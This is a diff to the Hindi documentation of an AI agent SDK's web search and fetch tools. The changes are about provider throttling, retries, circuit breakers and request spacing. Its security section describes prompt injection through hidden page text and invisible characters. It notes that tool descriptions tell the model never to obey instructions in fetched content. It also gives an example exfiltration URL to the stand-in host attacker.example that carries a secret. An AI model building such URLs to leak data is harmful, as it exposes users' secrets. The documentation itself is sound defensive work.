@@ -69,7 +69,7 @@ arXiv परिणामों में `authors`, `pdfUrl`, `updated` और `
 
 ## खोज प्रदाता {#search-providers}
 
-`web_search` अपने प्रदाताओं से **क्रम से** पूछता है: जो प्रदाता विफल हो, जिस पर rate limit लगे या जो captcha पेज से जवाब दे, वह अगले प्रदाता को काम सौंप देता है। जवाब बताता है कि किस प्रदाता ने जवाब दिया (`provider`) और उससे पहले वालों ने क्यों नहीं (`errors`)।
+`web_search` अपने प्रदाताओं से **क्रम से** पूछता है: जो प्रदाता विफल हो, या दूसरे प्रयास के बाद भी जिस पर throttling लगी रहे, वह अगले प्रदाता को काम सौंप देता है। जवाब बताता है कि किस प्रदाता ने जवाब दिया (`provider`) और उससे पहले वालों ने क्यों नहीं (`errors`)।
 
 ```ts
 import { brave, duckDuckGo, searxng, webTools } from '@sdk-ai-agents/core';
@@ -85,7 +85,7 @@ const tools = webTools({
 
 | प्रदाता | सेटअप | तारीख़ें | नोट |
 | --- | --- | --- | --- |
-| `duckDuckGo({ region?, minIntervalMs?, baseUrl? })` | कुछ नहीं (डिफ़ॉल्ट) | कुछ परिणामों में | DuckDuckGo का HTML पेज, कोई आधिकारिक API नहीं। शीर्षक, links और snippets; विज्ञापन छोड़ दिए जाते हैं। captcha पेज, या दो बार खाली पेज, अगले प्रदाता को काम सौंप देता है। दो खोजों के बीच 1.5 s। |
+| `duckDuckGo({ region?, minIntervalMs?, baseUrl? })` | कुछ नहीं (डिफ़ॉल्ट) | कुछ परिणामों में | DuckDuckGo का HTML पेज, कोई आधिकारिक API नहीं। शीर्षक, links और snippets; विज्ञापन छोड़ दिए जाते हैं। captcha पेज या खाली पेज को throttling माना जाता है। दो खोजों के बीच 4 s, पिछली खोज खत्म होने से गिनकर। |
 | `searxng({ baseUrl, engines?, categories?, minIntervalMs? })` | आपका [SearXNG](https://docs.searxng.org/) instance, जिसकी `settings.yml` में `formats: [html, json]` हो | `publishedDate` | हर परिणाम उस engine का नाम बताता है जिसने उसे ढूँढा (`searxng:bing`)। ऐसा जवाब जिसमें कोई परिणाम नहीं है क्योंकि उसके engines विफल हुए, अगले प्रदाता को काम सौंप देता है। |
 | `brave({ apiKey, baseUrl?, minIntervalMs? })` | एक Brave Search API key | `page_age` | दो खोजों के बीच 1 s, मुफ़्त प्लान की दर। |
 | `tavily({ apiKey, baseUrl?, minIntervalMs? })` | एक Tavily API key | `published_date` | `site` को `include_domains` के रूप में भेजा जाता है; भाषा नहीं भेजी जाती। |
@@ -93,7 +93,9 @@ const tools = webTools({
 
 हर प्रदाता `site`, `freshness` और `language` को अपने पैरामीटरों में बदलता है (क्वेरी में `site:`, `df`, `time_range`, `freshness=pw`, `tbs=qdr:w`, `kl`, `search_lang`…)। `site` के अलावा किसी दूसरी साइट के परिणाम हटा दिए जाते हैं, चाहे उन्हें किसी भी प्रदाता ने ढूँढा हो।
 
-**Circuit breaker।** जिस प्रदाता पर rate limit लगी हो (HTTP 429, captcha पेज), उसे तुरंत अलग रख दिया जाता है, किसी दूसरे प्रदाता को लगातार तीन विफलताओं के बाद: दो मिनट तक उसे बिना कोई अनुरोध भेजे छोड़ दिया जाता है (`errors` बताता है कब तक)। फिर उसे एक और मौका मिलता है। `circuitBreaker: { cooldownMs, failureThreshold }` ये दोनों बातें बदलता है।
+**Throttling।** जो प्रदाता किसी खोज पर throttling लगाए (HTTP 429, DuckDuckGo का captcha पेज या खाली पेज), उसे एक और प्रयास मिलता है, उसके माँगे इंतज़ार (`Retry-After`) या `throttleWaitMs` (10 s) के बाद, अधिकतम 30 s, जब कॉल की समय-सीमा में इसके लिए जगह हो।
+
+**Circuit breaker।** जिस प्रदाता पर उस दूसरे प्रयास के बाद भी throttling लगी रहे, उसे तुरंत अलग रख दिया जाता है, किसी दूसरे प्रदाता को लगातार तीन विफलताओं के बाद: दो मिनट तक उसे बिना कोई अनुरोध भेजे छोड़ दिया जाता है (`errors` बताता है कब तक)। फिर उसे एक और मौका मिलता है। `circuitBreaker: { cooldownMs, failureThreshold }` ये दोनों बातें बदलता है। जब किसी प्रदाता ने जवाब नहीं दिया, तो error (`SearchUnavailableError`) बताता है कि क्या सब पर throttling लगी थी (`throttled`) और छोड़े गए प्रदाता को फिर कब आज़माया जाएगा (`retryAfterMs`): अध्ययन ऐसी खोज को बाद में एक बार और आज़माता है।
 
 ### आपका अपना प्रदाता {#your-own-provider}
 
@@ -130,7 +132,8 @@ const intranetSearch: SearchProvider = {
 | `callTimeoutMs` | `60000` | पूरा कॉल, चाहे वह किसी भी चीज़ का इंतज़ार करे: robots.txt, अनुरोधों के बीच का अंतराल, हर redirect, body, और पेज या PDF से सामग्री निकालना। यह समय पार होते ही सब कुछ रद्द (abort) कर दिया जाता है और कॉल `WebTimeoutError` के साथ विफल होता है। यह हर प्रयास की सीमा है: `retry` के साथ कोई कॉल इस समय का `maxRetries + 1` गुना तक ले सकता है, और साथ में प्रयासों के बीच का इंतज़ार भी। |
 | `maxResponseBytes` | `2000000` | पढ़ी जाने वाली सबसे बड़ी body, decompress करने के बाद। |
 | `maxRedirects` | `5` | कितने redirects का पालन होता है; हर एक की फिर से जाँच होती है। |
-| `hostIntervalMs` | `1000` | एक ही host पर दो `web_fetch` अनुरोधों के बीच का न्यूनतम समय। |
+| `hostIntervalMs` | `1000` | किसी host पर एक `web_fetch` अनुरोध के खत्म होने और अगले के शुरू होने के बीच का न्यूनतम समय। |
+| `throttleWaitMs` | `10000` | throttling वाला प्रदाता या स्रोत, जब उसने खुद न बताया हो (`Retry-After`), अपने दूसरे प्रयास से पहले कितनी देर इंतज़ार करता है। |
 | `robots` | `true` | `web_fetch` robots.txt का पालन करता है; `false` इसे बंद करता है। |
 | `allowPrivateNetwork` | `false` | `true`, या hosts की एक सूची (`intranet.example`, `127.0.0.1:8080`) जो इस मशीन या निजी नेटवर्क पर हो सकते हैं। |
 | `lookup` | सिस्टम का resolver | host नामों को हल (resolve) करता है: `(hostname) => Promise<Array<{ address, family }>>`। |
@@ -138,7 +141,7 @@ const intranetSearch: SearchProvider = {
 | `maxPdfPages` | `30` | किसी PDF के कितने पेज पढ़े जाते हैं। |
 | `cache` | `{ ttlMs: 600000, maxEntries: 200, maxBytes: 20000000 }` | हर टूल और arguments के हिसाब से मेमोरी में रखे गए परिणाम, JSON के रूप में मापे गए ज़्यादा से ज़्यादा `maxBytes`; `false` इसे बंद करता है। |
 | `retry` | — | विफल कॉल के दोबारा प्रयास (`{ maxRetries }`): rate limits, सर्वर errors, timeouts और नेटवर्क विफलताओं पर; किसी अस्वीकृति, अधूरे सेटअप (`WebConfigurationError`) या ऐसी खोज पर कभी नहीं जिसका किसी प्रदाता ने जवाब नहीं दिया (`SearchUnavailableError`)। |
-| `arxiv` | `{ baseUrl: 'https://export.arxiv.org', minIntervalMs: 3000 }` | arXiv API अनुरोधों के बीच 3 s का अंतर माँगता है। |
+| `arxiv` | `{ baseUrl: 'https://export.arxiv.org', minIntervalMs: 3000 }` | arXiv API अनुरोधों के बीच 3 s का अंतर माँगता है, एक समय में एक अनुरोध: यह अंतर पिछले अनुरोध के खत्म होने से गिना जाता है। किसी अस्वीकृति (HTTP 406, 429, 503) को इंतज़ार के बाद एक और प्रयास मिलता है। |
 | `wikipedia` | `{ baseUrl: 'https://{language}.wikipedia.org', language: 'en' }` | `{language}` की जगह खोज की भाषा आती है। आपका दिया `baseUrl` निजी नेटवर्क की जाँच से तभी छूट पाता है जब `{language}` उसके host में न हो। |
 | `github` | `{ baseUrl: 'https://api.github.com' }` | `token` rate limit बढ़ाता है (उसके बिना एक मिनट में 10 खोजें) और code खोजने के लिए ज़रूरी है। |
 
@@ -148,7 +151,7 @@ const intranetSearch: SearchProvider = {
 2. **छूट का रास्ता स्पष्ट है।** `allowPrivateNetwork: ['intranet.example']` सिर्फ़ सूचीबद्ध hosts को जाने देता है, `true` सभी को। आप किसी प्रदाता या स्रोत को जो `baseUrl` देते हैं, वह आपके कोड से आता है, मॉडल से नहीं: उस तक पहुँचा जा सकता है, चाहे वह इसी मशीन पर हो (`localhost` पर एक SearXNG), पर सिर्फ़ उसके अपने origin पर, और सिर्फ़ उसी प्रदाता या स्रोत के अनुरोधों के लिए — कहीं और ले जाने वाले redirect की जाँच होती है, और `web_fetch` उसे फिर भी ठुकराता है। यह छूट `webTools()` कॉल होते समय तय हो जाती है (प्रदाता इसे `configuredOrigin` के रूप में घोषित करता है), किसी अनुरोध से कभी नहीं। डिफ़ॉल्ट सार्वजनिक endpoints (DuckDuckGo, arXiv, Wikipedia, GitHub) को कभी छूट नहीं मिलती: उनका DNS आपके नियंत्रण में नहीं है।
 3. **सिर्फ़ http और https**; कोई redirect https को कभी http में नहीं बदलता, ज़्यादा से ज़्यादा `maxRedirects` redirects, TLS certificates की हमेशा जाँच होती है। API key या token किसी ऐसे दूसरे origin पर कभी नहीं भेजा जाता जिसकी ओर कोई redirect ले जाए।
 4. **सीमित।** पूरे कॉल के लिए एक समय-सीमा (`callTimeoutMs`) और हर अनुरोध का timeout; decompress करने के बाद ज़्यादा से ज़्यादा `maxResponseBytes` पढ़े जाते हैं, और बाकी कभी डाउनलोड नहीं होता; PDF `maxPdfBytes` के भीतर (जो PDF इससे बड़ा आकार घोषित करे, उसे डाउनलोड होने से पहले ही ठुकरा दिया जाता है) और `maxPdfPages` के भीतर, और एक-एक करके एक worker में पढ़ी जाती हैं, जो pdf.js के पढ़ने से पहले PDF को parse करता है और उसे ठुकरा देता है अगर उसकी streams decompress होकर 256 MB से ज़्यादा हो जाएँ या वह उन्हें पढ़ न सके, और 1 GB की बढ़त या 20 s पार होते ही रुक जाता है (किसी encrypted PDF की यही एकमात्र सीमाएँ हैं, क्योंकि उसे मापा नहीं जा सकता); किसी पेज से सामग्री निकालना 100,000 elements और 5 s के काम के भीतर; सामग्री `maxChars` के भीतर। डाउनलोड के बाद का कोई भी काम प्रोसेस को अटका नहीं सकता: robots.txt का matcher रैखिक (linear) समय में चलता है, और HTML के रास्ते में कोई द्विघाती (quadratic) चरण नहीं है।
-5. **शिष्ट।** `web_fetch` robots.txt ([RFC 9309](https://www.rfc-editor.org/rfc/rfc9309)) पढ़ता है और वह कभी नहीं लाता जिसे robots.txt `sdk-ai-agents` के लिए मना करता है, redirects समेत: वह समूह जो `sdk-ai-agents` का नाम लेता है, वरना `*`; सबसे लंबा नियम जीतता है, बराबरी पर `Allow` जीतता है; `*` और `$` patterns; तुलना से पहले unreserved characters के escapes decode किए जाते हैं (`%7E` यानी `~`)। robots.txt न हो (4xx) तो सब कुछ अनुमत है; जो robots.txt विफल हो (5xx, 429) या जिस तक पहुँचा न जा सके, वह सब कुछ मना करता है। robots.txt पढ़ने की वजह से पहला पेज देर से नहीं आता; `Crawl-delay` उसके बाद के अनुरोधों के बीच अंतर रखवाता है, और 30 s से लंबी देरी अगले पेज को तब तक के लिए ठुकरा देती है। हर host पर अनुरोधों के बीच अंतराल रखा जाता है (पेजों के लिए 1 s, DuckDuckGo के लिए 1.5 s, arXiv के लिए 3 s), जवाब cache किए जाते हैं, और user agent बताता है कि कौन पूछ रहा है। खोज API crawl नहीं किए जाते: उन पर robots.txt लागू नहीं होता।
+5. **शिष्ट।** `web_fetch` robots.txt ([RFC 9309](https://www.rfc-editor.org/rfc/rfc9309)) पढ़ता है और वह कभी नहीं लाता जिसे robots.txt `sdk-ai-agents` के लिए मना करता है, redirects समेत: वह समूह जो `sdk-ai-agents` का नाम लेता है, वरना `*`; सबसे लंबा नियम जीतता है, बराबरी पर `Allow` जीतता है; `*` और `$` patterns; तुलना से पहले unreserved characters के escapes decode किए जाते हैं (`%7E` यानी `~`)। robots.txt न हो (4xx) तो सब कुछ अनुमत है; जो robots.txt विफल हो (5xx, 429) या जिस तक पहुँचा न जा सके, वह सब कुछ मना करता है। robots.txt पढ़ने की वजह से पहला पेज देर से नहीं आता; `Crawl-delay` उसके बाद के अनुरोधों के बीच अंतर रखवाता है, और 30 s से लंबी देरी अगले पेज को तब तक के लिए ठुकरा देती है। हर host पर अनुरोध एक-एक करके जाते हैं, हर एक पिछले के खत्म होने से गिने गए अंतराल के बाद (पेजों के लिए 1 s, DuckDuckGo के लिए 4 s, arXiv के लिए 3 s), और प्रोसेस के सभी `webTools()` यह अंतराल साझा करते हैं; throttling पर इंतज़ार के बाद एक और प्रयास होता है, प्रयासों की झड़ी नहीं; जवाब cache किए जाते हैं, और user agent बताता है कि कौन पूछ रहा है। खोज API crawl नहीं किए जाते: उन पर robots.txt लागू नहीं होता।
 6. **सामग्री डेटा है।** हर जवाब में `untrusted: true` लिखा होता है, और टूल के विवरण मॉडल से कहते हैं कि उसमें मिले निर्देशों का कभी पालन न करे। सामग्री निकालने से पहले, `web_fetch` वह सब हटा देता है जो पाठक नहीं देख सकता पर मॉडल देख लेता: ऐसे elements जो `hidden`, `aria-hidden="true"`, `display:none` या `visibility:hidden` हों, जिनका font size शून्य हो या opacity शून्य हो, HTML comments, और अदृश्य characters: zero-width और bidirectional controls, Tags block (जो टेक्स्ट को अदृश्य रूप से लिखता है) और variation selectors। खोज परिणामों और error संदेशों को भी इसी तरह साफ़ किया जाता है; कोई error किसी सर्वर के जवाब की ज़्यादा से ज़्यादा एक लाइन उद्धृत करता है, जो अविश्वसनीय के रूप में चिह्नित होती है। कोई अध्ययन परिणामों को अपने मॉडल के सामने अविश्वसनीय डेटा के चिह्नों के बीच रखता है।
 7. **नियंत्रित।** `web_fetch` का जोखिम मध्यम है, कम नहीं: URL मॉडल चुनता है, और कोई URL डेटा को बाहर ले जा सकता है (`https://attacker.example/?q=<secret>`)। इसे उन एजेंटों से दूर रखें जिनके पास secrets हैं, या हर कॉल को किसी इंसान से मंज़ूर करवाएँ:
 
@@ -189,4 +192,4 @@ const study = sdk.createStudy({ name: 'browser', object, objective, sources });
 - **मुख्य सामग्री का एक सरल नियम।** `<main>`, सबसे लंबा `<article>`, वरना `<body>`: मुख्य सामग्री के भीतर का boilerplate बना रहता है।
 - **कोई OCR नहीं।** स्कैन की गई PDF में पढ़ने के लिए कोई टेक्स्ट नहीं होता।
 - **DuckDuckGo का HTML पेज कोई API नहीं है।** उसका format बदल सकता है और भारी इस्तेमाल को वह धीमा कर देता है (throttling): ज़्यादा मात्रा के लिए कोई दूसरा प्रदाता कॉन्फ़िगर करें।
-- **Caches और अनुरोधों के बीच का अंतराल मेमोरी में रहते हैं**, हर `webTools()` कॉल के अपने, और प्रोसेस खत्म होने पर खो जाते हैं।
+- **Caches और अनुरोधों के बीच का अंतराल मेमोरी में रहते हैं**, और प्रोसेस खत्म होने पर खो जाते हैं: caches हर `webTools()` कॉल के अपने, अंतराल पूरे प्रोसेस का। उसी मशीन पर कोई दूसरा प्रोसेस अपना अंतराल अलग रखता है।
